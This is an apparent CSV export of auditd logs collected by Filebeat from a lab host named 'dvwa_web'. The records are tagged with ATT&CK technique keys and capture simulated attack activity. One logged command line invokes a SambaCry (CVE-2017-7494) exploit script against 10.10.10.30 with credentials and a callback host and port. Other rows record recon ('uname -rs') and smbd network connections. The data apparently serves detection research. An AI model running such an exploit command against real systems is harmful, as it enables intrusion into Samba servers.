"@timestamp","_id","_index","_score","agent.ephemeral_id","agent.hostname","agent.id","agent.name","agent.type","agent.version","auditd.log.AUID","auditd.log.EGID","auditd.log.EUID","auditd.log.FSGID","auditd.log.FSUID","auditd.log.GID","auditd.log.OGID","auditd.log.OLD-AUID","auditd.log.SGID","auditd.log.SUID","auditd.log.SYSCALL","auditd.log.UID","auditd.log.a0","auditd.log.a1","auditd.log.a2","auditd.log.a3","auditd.log.arch","auditd.log.cap_fe","auditd.log.cap_fi","auditd.log.cap_fp","auditd.log.cap_frootid","auditd.log.cap_fver","auditd.log.dev","auditd.log.epoch","auditd.log.fe","auditd.log.fi","auditd.log.fp","auditd.log.frootid","auditd.log.fver","auditd.log.grantors","auditd.log.hostname","auditd.log.inode","auditd.log.item","auditd.log.items","auditd.log.key","auditd.log.kv","auditd.log.laddr","auditd.log.lport","auditd.log.mode","auditd.log.name","auditd.log.nametype","auditd.log.nlnk-fam","auditd.log.nlnk-pid","auditd.log.old_auid","auditd.log.old_pa","auditd.log.old_pe","auditd.log.old_pi","auditd.log.old_pp","auditd.log.old_ses","auditd.log.op","auditd.log.pa","auditd.log.pe","auditd.log.pi","auditd.log.pp","auditd.log.proctitle","auditd.log.rdev","auditd.log.record_type","auditd.log.saddr","auditd.log.saddr_fam","auditd.log.sequence","auditd.log.ses","auditd.log.subj_apparmor","auditd.log.success","auditd.log.syscall","auditd.log.tty","auditd.log.uid","ecs.version","error.message","event.action","event.category","event.dataset","event.ingested","event.kind","event.module","event.original","event.outcome","event.type","fileset.name","host.architecture","host.containerized","host.hostname","host.id","host.ip","host.mac","host.name","host.os.codename","host.os.family","host.os.kernel","host.os.name","host.os.name.text","host.os.platform","host.os.type","host.os.version","input.type","log.file.path","log.offset",message,"network.direction","process.args","process.args_count","process.executable","process.executable.text","process.exit_code","process.name","process.name.text","process.parent.pid","process.pid","process.working_directory","process.working_directory.text","service.type","source.address","source.as.number","source.as.organization.name","source.as.organization.name.text","source.geo.city_name","source.geo.continent_name","source.geo.country_iso_code","source.geo.country_name","source.geo.location","source.geo.region_iso_code","source.geo.region_name","source.ip","traefik.access.geoip.city_name","traefik.access.geoip.continent_name","traefik.access.geoip.country_iso_code","traefik.access.geoip.location","traefik.access.geoip.region_iso_code","traefik.access.geoip.region_name","user.audit.id","user.effective.group.id","user.effective.id","user.effective.name","user.effective.name.text","user.filesystem.group.id","user.filesystem.id","user.group.id","user.id","user.name","user.name.text","user.owner.group.id","user.owner.id","user.saved.group.id","user.saved.id","user.terminal"
"Oct 24, 2022 @ 23:29:16.146","Lt-cCoQBDsc6tFfSyASi",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","1666625298.705","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","UNKNOWN[1421]","-","-","484,136","-","-","-","-","-","-","1.12.0","field [auditd.log.kv] doesn't exist","-","-","auditd.log","Oct 24, 2022 @ 23:29:17.985","-",auditd,"-","-","-",log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,307,528","type=UNKNOWN[1421] msg=audit(1666625298.705:484136):","-","-","-","-","-","-","-","-","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 24, 2022 @ 23:29:15.529","Et-cCoQBDsc6tFfS2kLN",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3",unset,root,root,root,root,root,"-","-",root,root,socket,root,2,1,0,0,"x86_64","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",0,"T1011_Exfiltration_Over_Other_Network_Medium""ARCH=x86_64","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","484,549",4294967295,"-",yes,41,"(none)","-","1.12.0","-",syscall,process,"auditd.log","Oct 24, 2022 @ 23:29:22.633",event,auditd,"type=SYSCALL msg=audit(1666625355.529:484549): arch=c000003e syscall=41 success=yes exit=35 a0=2 a1=1 a2=0 a3=0 items=0 ppid=222873 pid=256648 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm=""smbd"" exe=""/usr/local/samba/sbin/smbd"" subj=? key=""T1011_Exfiltration_Over_Other_Network_Medium""ARCH=x86_64 SYSCALL=socket AUID=""unset"" UID=""root"" GID=""root"" EUID=""root"" SUID=""root"" FSUID=""root"" EGID=""root"" SGID=""root"" FSGID=""root""","-",info,log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,628,160","-","-","-","-","/usr/local/samba/sbin/smbd","/usr/local/samba/sbin/smbd",35,smbd,smbd,"222,873","256,648",auditd,4294967295,0,0,"-","-",0,0,0,0,"-","-","-","-",0,0,"-"
"Oct 24, 2022 @ 23:29:15.529","E9-cCoQBDsc6tFfS2kLN",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","/usr/local/samba/sbin/smbd^@-F^@-S^@-s^@/smb.conf^@--debuglevel=10","-","-","-","-","484,549","-","-","-","-","-","-","1.12.0","-",proctitle,"-","auditd.log","Oct 24, 2022 @ 23:29:22.634",event,auditd,"type=PROCTITLE msg=audit(1666625355.529:484549): proctitle=2F7573722F6C6F63616C2F73616D62612F7362696E2F736D6264002D46002D53002D73002F736D622E636F6E66002D2D64656275676C6576656C3D3130","-","-",log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,628,640","-","-","-","-","-","-","-","-","-","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 24, 2022 @ 23:29:15.529","FN-cCoQBDsc6tFfS2kLN",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","484,549","-",unconfined,"-","-","-","-","1.12.0","-","unknown[1420]","-","auditd.log","Oct 24, 2022 @ 23:29:22.634",event,auditd,"type=UNKNOWN[1420] msg=audit(1666625355.529:484549): subj_apparmor=unconfined","-","-",log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,628,822","-","-","-","-","-","-","-","-","-","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 24, 2022 @ 23:29:15.529","Fd-cCoQBDsc6tFfS2kLN",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3",unset,root,root,root,root,root,"-","-",root,root,connect,root,23,7fff9f773530,10,0,"x86_64","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",0,"network_connect_4""ARCH=x86_64","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","484,550",4294967295,"-",yes,42,"(none)","-","1.12.0","-",syscall,process,"auditd.log","Oct 24, 2022 @ 23:29:22.634",event,auditd,"type=SYSCALL msg=audit(1666625355.529:484550): arch=c000003e syscall=42 success=yes exit=0 a0=23 a1=7fff9f773530 a2=10 a3=0 items=0 ppid=222873 pid=256648 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm=""smbd"" exe=""/usr/local/samba/sbin/smbd"" subj=? key=""network_connect_4""ARCH=x86_64 SYSCALL=connect AUID=""unset"" UID=""root"" GID=""root"" EUID=""root"" SUID=""root"" FSUID=""root"" EGID=""root"" SGID=""root"" FSGID=""root""","-",info,log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,628,900","-",egress,"-","-","/usr/local/samba/sbin/smbd","/usr/local/samba/sbin/smbd",0,smbd,smbd,"222,873","256,648",auditd,4294967295,0,0,"-","-",0,0,0,0,"-","-","-","-",0,0,"-"
"Oct 24, 2022 @ 23:29:15.529","F9-cCoQBDsc6tFfS2kLN",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","/usr/local/samba/sbin/smbd^@-F^@-S^@-s^@/smb.conf^@--debuglevel=10","-","-","-","-","484,550","-","-","-","-","-","-","1.12.0","-",proctitle,"-","auditd.log","Oct 24, 2022 @ 23:29:22.635",event,auditd,"type=PROCTITLE msg=audit(1666625355.529:484550): proctitle=2F7573722F6C6F63616C2F73616D62612F7362696E2F736D6264002D46002D53002D73002F736D622E636F6E66002D2D64656275676C6576656C3D3130","-","-",log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,629,508","-","-","-","-","-","-","-","-","-","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 24, 2022 @ 23:29:15.529","GN-cCoQBDsc6tFfS2kLN",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","484,550","-",unconfined,"-","-","-","-","1.12.0","-","unknown[1420]","-","auditd.log","Oct 24, 2022 @ 23:29:22.635",event,auditd,"type=UNKNOWN[1420] msg=audit(1666625355.529:484550): subj_apparmor=unconfined","-","-",log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,629,690","-","-","-","-","-","-","-","-","-","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 24, 2022 @ 23:29:15.473","D9-cCoQBDsc6tFfS2kLN",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3",unset,root,root,root,root,root,"-","-",root,root,socket,root,2,1,6,fffffffffffff70f,"x86_64","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",0,"T1011_Exfiltration_Over_Other_Network_Medium""ARCH=x86_64","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","484,548",4294967295,"-",yes,41,pts0,"-","1.12.0","-",syscall,process,"auditd.log","Oct 24, 2022 @ 23:29:22.632",event,auditd,"type=SYSCALL msg=audit(1666625355.473:484548): arch=c000003e syscall=41 success=yes exit=3 a0=2 a1=1 a2=6 a3=fffffffffffff70f items=0 ppid=256610 pid=256634 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=4294967295 comm=""python2.7"" exe=""/exploits/Lateral_Movement_T1210/venv/bin/python"" subj=? key=""T1011_Exfiltration_Over_Other_Network_Medium""ARCH=x86_64 SYSCALL=socket AUID=""unset"" UID=""root"" GID=""root"" EUID=""root"" SUID=""root"" FSUID=""root"" EGID=""root"" SGID=""root"" FSGID=""root""","-",info,log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,627,297","-","-","-","-","/exploits/Lateral_Movement_T1210/venv/bin/python","/exploits/Lateral_Movement_T1210/venv/bin/python",3,"python2.7","python2.7","256,610","256,634",auditd,4294967295,0,0,"-","-",0,0,0,0,"-","-","-","-",0,0,"-"
"Oct 24, 2022 @ 23:29:15.473","EN-cCoQBDsc6tFfS2kLN",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","python2.7^@cve_2017_7494.py^@-t^@10.10.10.30^@-u^@sambacry^@-P^@nosambanocry^@--rhost^@10.10.10.10^@--rport^@31337","-","-","-","-","484,548","-","-","-","-","-","-","1.12.0","-",proctitle,"-","auditd.log","Oct 24, 2022 @ 23:29:22.633",event,auditd,"type=PROCTITLE msg=audit(1666625355.473:484548): proctitle=707974686F6E322E37006376655F323031375F373439342E7079002D740031302E31302E31302E3330002D750073616D6261637279002D50006E6F73616D62616E6F637279002D2D72686F73740031302E31302E31302E3130002D2D72706F7274003331333337","-","-",log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,627,816","-","-","-","-","-","-","-","-","-","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 24, 2022 @ 23:29:15.473","Ed-cCoQBDsc6tFfS2kLN",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","484,548","-",unconfined,"-","-","-","-","1.12.0","-","unknown[1420]","-","auditd.log","Oct 24, 2022 @ 23:29:22.633",event,auditd,"type=UNKNOWN[1420] msg=audit(1666625355.473:484548): subj_apparmor=unconfined","-","-",log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,628,082","-","-","-","-","-","-","-","-","-","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 24, 2022 @ 23:29:15.259",596cCoQBDsc6tFfSxfyJ,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","1666625298.577","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","UNKNOWN[1421]","-","-","483,994","-","-","-","-","-","-","1.12.0","field [auditd.log.kv] doesn't exist","-","-","auditd.log","Oct 24, 2022 @ 23:29:17.190","-",auditd,"-","-","-",log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,209,796","type=UNKNOWN[1421] msg=audit(1666625298.577:483994):","-","-","-","-","-","-","-","-","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 24, 2022 @ 23:29:15.259",7N6cCoQBDsc6tFfSxfyJ,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","1666625298.577","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","UNKNOWN[1421]","-","-","483,995","-","-","-","-","-","-","1.12.0","field [auditd.log.kv] doesn't exist","-","-","auditd.log","Oct 24, 2022 @ 23:29:17.191","-",auditd,"-","-","-",log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,210,986","type=UNKNOWN[1421] msg=audit(1666625298.577:483995):","-","-","-","-","-","-","-","-","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 24, 2022 @ 23:29:14.985","_d-cCoQBDsc6tFfS2kHN",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3",unset,root,root,root,root,root,"-","-",root,root,execve,root,55dfae4439d0,55dfae2f48a0,7ffd4f5e6c98,1000,"x86_64","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",2,"recon""ARCH=x86_64","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","484,546",4294967295,"-",yes,59,pts0,"-","1.12.0","-",syscall,process,"auditd.log","Oct 24, 2022 @ 23:29:22.629",event,auditd,"type=SYSCALL msg=audit(1666625354.985:484546): arch=c000003e syscall=59 success=yes exit=0 a0=55dfae4439d0 a1=55dfae2f48a0 a2=7ffd4f5e6c98 a3=1000 items=2 ppid=256627 pid=256630 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=4294967295 comm=""uname"" exe=""/bin/uname"" subj=? key=""recon""ARCH=x86_64 SYSCALL=execve AUID=""unset"" UID=""root"" GID=""root"" EUID=""root"" SUID=""root"" FSUID=""root"" EGID=""root"" SGID=""root"" FSGID=""root""","-",info,log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,624,368","-","-","-","-","/bin/uname","/bin/uname",0,uname,uname,"256,627","256,630",auditd,4294967295,0,0,"-","-",0,0,0,0,"-","-","-","-",0,0,"-"
"Oct 24, 2022 @ 23:29:14.985","_t-cCoQBDsc6tFfS2kHN",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",0,0,0,0,0,"-","-","-","-","-","-","-","-","-","-","-","-","-","-",0,0000003fffffffff,0,0000003fffffffff,"-","-",0,0000003fffffffff,0,0000003fffffffff,"-","-","-","-","-","484,546","-","-","-","-","-","-","1.12.0","-","bprm_fcaps","-","auditd.log","Oct 24, 2022 @ 23:29:22.630",event,auditd,"type=BPRM_FCAPS msg=audit(1666625354.985:484546): fver=0 fp=0 fi=0 fe=0 old_pp=0000003fffffffff old_pi=0 old_pe=0000003fffffffff old_pa=0 pp=0000003fffffffff pi=0 pe=0000003fffffffff pa=0 frootid=0","-","-",log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,624,827","-","-","-","-","-","-","-","-","-","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 24, 2022 @ 23:29:14.985","_9-cCoQBDsc6tFfS2kHN",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","484,546","-","-","-","-","-","-","1.12.0","-",execve,"-","auditd.log","Oct 24, 2022 @ 23:29:22.630",event,auditd,"type=EXECVE msg=audit(1666625354.985:484546): argc=2 a0=""uname"" a1=""-rs""","-","-",log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,625,025","-","-","uname, -rs",2,uname,uname,"-","-","-","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 24, 2022 @ 23:29:14.985","Ad-cCoQBDsc6tFfS2kLN",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-","-","-","-","-","-",root,"-","-","-","-","-","-","-","-","-","-",0,0,0,"0OUID=""root",0,"00:62","-","-","-","-","-","-","-",4985325,0,"-","-","-","-","-",0100755,"/bin/uname",NORMAL,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","00:00","-","-","-","484,546","-","-","-","-","-","-","1.12.0","-",path,"-","auditd.log","Oct 24, 2022 @ 23:29:22.630",event,auditd,"type=PATH msg=audit(1666625354.985:484546): item=0 name=""/bin/uname"" inode=4985325 dev=00:62 mode=0100755 ouid=0 ogid=0 rdev=00:00 obj=? nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root""","-","-",log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,625,151","-","-","-","-","-","-","-","-","-","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-",0,0,"-","-","-"
